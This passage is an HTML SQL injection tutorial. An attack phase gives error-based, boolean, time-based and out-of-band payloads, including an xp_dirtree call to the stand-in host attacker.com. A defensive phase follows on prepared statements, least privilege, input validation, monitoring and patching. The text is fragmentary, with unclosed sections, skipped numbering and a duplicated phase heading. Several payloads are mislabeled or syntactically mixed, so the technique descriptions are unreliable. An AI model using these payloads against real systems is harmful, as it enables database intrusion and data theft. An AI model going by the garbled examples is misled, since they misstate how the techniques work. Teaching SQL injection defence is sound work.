            <h3>Phase 3: Crafting SQL Injection Attacks</h3>
            <ol start="6">
                <li><strong>Error-Based SQLi:</strong> Inject SQL commands that cause database errors visible on the client side to understand the database structure. Example: <code>' UNION SELECT 1,@@version--</code>
                    <p><strong>Objective:</strong> Gather detailed database structure information from error messages.</p>
                    <p><strong>Execution:</strong> Use errors generated by malformed SQL queries to extract information about database version or schema.</p>
                </li>
                <li><strong>Boolean-Based SQLi:</strong> Manipulate SQL queries and observe changes in page content. Example: <code>' AND 1=2 UNION SELECT 1,username FROM users--</code>
                    <p><strong>Objective:</strong> Confirm data hypotheses by changing query logic and observing page content changes.</p>
                    <p><strong>Execution:</strong> Alter results based on the truth value of injected SQL conditions to map out database content.</p>
                </li>
                <li><strong>Time-Based Blind SQLi:</strong> Use time delays as data exfiltration mechanisms. Example: <code>'; IF (SUBSTRING(@@version,1,1) = '5', sleep(5), 'false') --</code>
                    <p><strong>Objective:</strong> Infer data values by causing the database to delay responses.</p>
                    <p><strong>Execution:</strong> Monitor response times to determine if certain conditions within the database are true.</p>
                </li>
                <li><strong>Out-of-Band SQLi:</strong> Force the database to interact with an external server. Example: <code>'; EXEC master..xp_dirtree '//attacker.com/c'</code>
                    <p><strong>Objective:</strong> Extract data via external server interactions.</p>
                    <p><strong>Execution:</strong> Trigger database operations that call out to external servers to verify or extract data.</p>

        <section class="tutorial-phase5">
            <h3>Phase 5: Preventing SQL Injection</h3>
            <ol start="13">
                <li><strong>Implementing Prepared Statements:</strong> Use parameterized queries in your applications. Example in PHP: <code>$stmt = $pdo-&gt;prepare('SELECT * FROM users WHERE username = :username');</code>
                    <p><strong>Objective:</strong> Secure SQL queries to prevent the execution of malicious SQL.</p>
                    <p><strong>Execution:</strong> Use prepared statements to separate data from SQL logic, ensuring that user input is treated as data, not executable code.</p>
                </li>

        <section class="tutorial-phase6">
            <h3>Phase 5: Preventing SQL Injection (Continued)</h3>
            <ol start="16">
                <li><strong>Escaping All User Inputs:</strong> Although not a primary defense, escaping user inputs can provide an additional layer of security. In PHP, you can use <code>mysqli_real_escape_string()</code> or similar functions to ensure that user inputs do not interfere with SQL commands.
                    <p><strong>Objective:</strong> Prevent SQL injection by escaping special characters in user inputs.</p>
                    <p><strong>Execution:</strong> Apply escaping functions to sanitize user inputs before using them in SQL queries.</p>
                </li>
                <li><strong>Least Privilege:</strong> Ensure that database connections from your applications use an account with the minimum necessary privileges. This reduces potential damage from a successful injection. Set up database roles that restrict access to only what's necessary for each part of your application.
                    <p><strong>Objective:</strong> Limit the impact of SQL injection attacks by restricting database access rights.</p>
                    <p><strong>Execution:</strong> Create database roles with restricted privileges, granting only the necessary access for each part of your application.</p>
                </li>
                <li><strong>Whitelisting Input Validation:</strong> Rather than just escaping inputs, validate and whitelist user inputs to reject any data that does not meet specific criteria. This can be effectively done using regular expressions or dedicated libraries depending on the programming language in use.
                    <p><strong>Objective:</strong> Ensure that only expected and safe inputs are accepted, rejecting potentially malicious inputs.</p>
                    <p><strong>Execution:</strong> Implement input validation mechanisms such as whitelisting to validate user inputs against predefined criteria.</p>
                </li>
                <li><strong>Security Configuration:</strong> Adjust your database and web server settings to show minimal error information to end users. For instance, configure SQL Server to suppress detailed error messages and instead log them for internal review.
                    <p><strong>Objective:</strong> Minimize the risk of information leakage during SQL injection attacks by configuring server settings appropriately.</p>
                    <p><strong>Execution:</strong> Configure database and web server settings to limit the amount of error information exposed to end users, while ensuring that detailed errors are logged internally for review.</p>
                </li>
            </ol>

                    <p><strong>Objective:</strong> Detect and respond to SQL injection attempts or other security breaches in real-time.</p>
                    <p><strong>Execution:</strong> Deploy IDS solutions like Snort or Suricata and configure rules to detect SQL injection patterns.</p>
                </li>
                <li><strong>Log Analysis:</strong> Regularly analyze logs for unusual activities that could indicate an attempted or successful SQL injection. Tools like Splunk or ELK Stack can automate much of this process.
                    <p><strong>Objective:</strong> Identify security incidents, including SQL injection attempts, through log analysis.</p>
                    <p><strong>Execution:</strong> Use log analysis tools to parse and analyze logs, setting up alerts for timely detection and response.</p>
                </li>
                <li><strong>Incident Response Plan:</strong> Develop and train your team on an incident response plan. Know what steps to take in case of a detected SQL injection or other security breaches, including containment, eradication, and recovery processes.

                    <p><strong>Execution:</strong> Develop and regularly update an incident response plan, training your team on its procedures and conducting drills for readiness.</p>
                </li>
                <li><strong>Continuous Education:</strong> Keep your development and security teams updated with the latest security practices, vulnerabilities, and defensive tactics. Regular training sessions and updates can significantly reduce the risk of security breaches.
                    <p><strong>Objective:</strong> Equip teams with the knowledge and skills to identify and mitigate security risks effectively.</p>
                    <p><strong>Execution:</strong> Provide regular training sessions, workshops, and updates on security best practices and emerging threats.</p>
                </li>
                <li><strong>Patch Management:</strong> Keep your software, libraries, and frameworks up to date. Regularly apply patches and updates to all components of your software stack to close off vulnerabilities that could be exploited via SQL injection or other methods.
                    <p><strong>Objective:</strong> Address known vulnerabilities promptly to reduce the risk of exploitation.</p>
                    <p><strong>Execution:</strong> Implement a patch management process that includes regular vulnerability assessments, testing, and deployment of patches and updates.</p>
